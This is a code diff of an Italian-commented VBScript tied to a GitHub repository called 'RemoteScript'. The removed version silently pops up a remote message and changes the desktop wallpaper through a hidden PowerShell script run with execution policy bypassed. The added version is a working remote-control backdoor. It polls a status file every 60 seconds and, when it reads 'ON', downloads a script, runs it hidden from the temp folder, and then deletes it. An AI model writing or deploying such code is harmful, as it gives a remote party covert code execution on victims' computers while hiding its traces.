@@ -1,60 +1,63 @@
 Option Explicit
 On Error Resume Next
 
-Dim shell, fso, urlImmagine, urlMessaggio, percorsoLocale, percorsoScript, scriptPS, messaggioDalWeb, xmlHttp
+Dim shell, fso, xmlHttp
+Dim urlStatus, urlPayload
+Dim statusContent, payloadContent
+Dim tempScriptPath, fileTemp
 
-' URL ottimizzati per il download diretto
-urlImmagine = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/immagine.jpg"
-urlMessaggio = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/messaggio.txt"
+' --- CONFIGURAZIONE URL ---
+' Questi URL puntano ai file nel tuo repository mostrato nell'immagine
+urlStatus  = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/status.txt"
+urlPayload = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/script.txt"
 
 Set shell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
-
-' --- 1. RECUPERA IL MESSAGGIO ---
 Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-xmlHttp.Open "GET", urlMessaggio, False
-xmlHttp.Send
-If xmlHttp.Status = 200 Then
-    messaggioDalWeb = Trim(xmlHttp.responseText)
-End If
 
-' --- 2. MOSTRA IL POPUP (Solo se il messaggio non è vuoto) ---
-If messaggioDalWeb <> "" Then
-    Dim comandoPopup
-    comandoPopup = "powershell -WindowStyle Hidden -NoProfile -Command ""Add-Type -AssemblyName System.Windows.Forms; " & _
-        "$form = New-Object System.Windows.Forms.Form; $form.Text = 'Sistema'; $form.Size = New-Object System.Drawing.Size(400,180); " & _
-        "$form.StartPosition = 'CenterScreen'; $form.FormBorderStyle = 'FixedDialog'; $form.ControlBox = $false; $form.TopMost = $true; " & _
-        "$label = New-Object System.Windows.Forms.Label; $label.Text = '" & messaggioDalWeb & "'; $label.TextAlign = 'MiddleCenter'; $label.Dock = 'Fill'; " & _
-        "$label.Font = New-Object System.Drawing.Font('Segoe UI', 11); " & _
-        "$form.Controls.Add($label); $panel = New-Object System.Windows.Forms.Panel; $panel.Dock = 'Bottom'; $panel.Height = 50; " & _
-        "$btn = New-Object System.Windows.Forms.Button; $btn.Text = 'OK'; $btn.Left = 160; $btn.Top = 10; $btn.Add_Click({$form.Close()}); " & _
-        "$panel.Controls.Add($btn); $form.Controls.Add($panel); $form.ShowDialog() | Out-Null"""
-    shell.Run comandoPopup, 0, True
-End If
+' --- LOOP DI CONTROLLO ---
+Do
+    ' 1. Scarica lo stato (status.txt)
+    xmlHttp.Open "GET", urlStatus, False
+    ' Intestazione per evitare che la cache del server/proxy ti dia dati vecchi
+    xmlHttp.SetRequestHeader "If-Modified-Since", "Sat, 1 Jan 2000 00:00:00 GMT"
+    xmlHttp.Send
 
-' --- 3. CAMBIO SFONDO ---
-percorsoLocale = shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Pictures\bg_data.jpg"
-percorsoScript = shell.ExpandEnvironmentStrings("%TEMP%") & "\sys_task.ps1"
+    If xmlHttp.Status = 200 Then
+        ' Pulisce la risposta da spazi e ritorni a capo
+        statusContent = UCase(Trim(xmlHttp.responseText))
+        statusContent = Replace(statusContent, vbCr, "")
+        statusContent = Replace(statusContent, vbLf, "")
+        
+        ' 2. Se lo stato è "ON", scarica ed esegue il payload (script.txt)
+        If InStr(statusContent, "ON") > 0 Then
+            
+            ' Scarica il contenuto dello script da eseguire
+            xmlHttp.Open "GET", urlPayload, False
+            xmlHttp.SetRequestHeader "If-Modified-Since", "Sat, 1 Jan 2000 00:00:00 GMT"
+            xmlHttp.Send
+            
+            If xmlHttp.Status = 200 Then
+                payloadContent = xmlHttp.responseText
+                
+                ' Definisce un percorso temporaneo per lo script dinamico
+                tempScriptPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\task_remoto.vbs"
+                
+                ' Salva il contenuto scaricato in un file .vbs
+                Set fileTemp = fso.CreateTextFile(tempScriptPath, True)
+                fileTemp.Write payloadContent
+                fileTemp.Close
+                
+                ' Esegue il nuovo script scaricato
+                ' Il parametro ,0,True significa: nascosto e attendi che finisca
+                shell.Run "wscript.exe """ & tempScriptPath & """", 0, True
+                
+                ' Opzionale: Cancella lo script dopo l'esecuzione per pulizia
+                If fso.FileExists(tempScriptPath) Then fso.DeleteFile tempScriptPath
+            End If
+        End If
+    End If
 
-' PowerShell scarica l'immagine e forza l'aggiornamento dei parametri di sistema
-scriptPS = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; try { " & _
-    "(New-Object System.Net.WebClient).DownloadFile('" & urlImmagine & "', '" & percorsoLocale & "'); " & _
-    "if (Test-Path '" & percorsoLocale & "') { " & _
-    "$path = (Get-Item '" & percorsoLocale & "').FullName; " & _
-    "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper -Value $path; " & _
-    "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name WallpaperStyle -Value '10'; " & _
-    "$code = @' " & vbCrLf & _
-    "using System; using System.Runtime.InteropServices; " & vbCrLf & _
-    "public class Wallpaper { [DllImport(""user32.dll"")] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); } " & vbCrLf & _
-    "'@; Add-Type -TypeDefinition $code; [Wallpaper]::SystemParametersInfo(0x0014, 0, $path, 0x0003); } } catch {}"
-
-Dim f
-Set f = fso.CreateTextFile(percorsoScript, True)
-f.Write scriptPS
-f.Close
-
-shell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & percorsoScript & """", 0, True
-
-' --- 4. PULIZIA ---
-WScript.Sleep 5000
-If fso.FileExists(percorsoScript) Then fso.DeleteFile percorsoScript
+    ' 3. Attesa di 60 secondi prima del prossimo controllo
+    WScript.Sleep 60000
+Loop
